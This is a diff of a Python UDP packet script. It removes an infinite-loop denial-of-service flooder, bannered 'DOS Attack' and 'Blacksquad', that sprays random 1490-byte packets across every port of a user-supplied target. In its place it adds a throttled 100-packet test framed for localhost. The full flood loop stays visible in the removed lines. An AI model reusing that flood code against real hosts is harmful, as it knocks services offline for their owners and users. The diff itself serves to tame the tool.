@@ -1,53 +1,33 @@
-import sys
-import os
-import time
 import socket
 import random
-#Code Time
+import time
 from datetime import datetime
+
+# Show timestamp
 now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+print(f"Script started at: {now.strftime('%Y-%m-%d %H:%M:%S')}")
 
-##############
+# Setup socket and data
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+data = random._urandom(1490)  # Sample data to send
 
-os.system("clear")
-os.system("figlet DOS Attack ")
+# Input IP and Port for safe testing (e.g., localhost)
+ip = input("Enter target IP (e.g., 127.0.0.1): ")
+port = int(input("Enter target port (e.g., 9999): "))
 
-print " "
-print "Author   : Ngulefac Theophilus"
-print "github   : https://github.com/Ngulefac"
-
-print
-ip = raw_input("IP Target(eg: 127.0.0.1) : ")
-port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet 'Blacksquad'")
-os.system("figlet 'Attack Starting'")
-os.system("echo '       ]===> I am the Boss now <===['")
-print " \n"
-print "[                     ] 0% "
-time.sleep(5)
-print "[=====>               ] 25%"
-time.sleep(5)
-print "[==========>          ] 50%"
-time.sleep(5)
-print "[===============>     ] 75%"
-time.sleep(5)
-print "[====================>] 100%"
-time.sleep(3)
+print("\n[====================>] Sending Test UDP Packets <[====================]")
 sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1 
+
+try:
+    while sent < 100:  # Send a limited number for safety
+        sock.sendto(data, (ip, port))
+        sent += 1
+        print(f"Sent packet {sent} to {ip}:{port}")
+        time.sleep(0.1)  # Throttle to avoid flooding
+except KeyboardInterrupt:
+    print("\nInterrupted by user. Exiting safely.")
+except Exception as e:
+    print(f"Error: {e}")
+finally:
+    sock.close()
+    print("Socket closed.")
